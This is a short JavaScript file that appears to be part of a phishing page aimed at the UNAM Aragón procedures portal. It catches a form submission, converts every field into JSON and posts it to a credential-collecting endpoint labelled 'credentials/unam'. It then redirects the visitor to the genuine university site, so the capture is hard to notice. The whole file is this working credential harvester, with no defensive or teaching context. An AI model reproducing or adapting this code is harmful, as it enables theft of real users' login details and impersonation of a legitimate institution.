document.querySelector("form").addEventListener("submit", async (evt) => {
  evt.preventDefault();

  const form = evt.target;
  const formData = Object.fromEntries(new FormData(form).entries());

  console.log(formData);

  const resp = await fetch("http://localhost:8080/api/v1/credentials/unam", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(formData),
  });
  const data = await resp.json();

  if (!resp.ok) console.error("Error al registrar las credenciales.");

  console.log(data);
  window.location.replace("https://tramifes.aragon.unam.mx/");
});
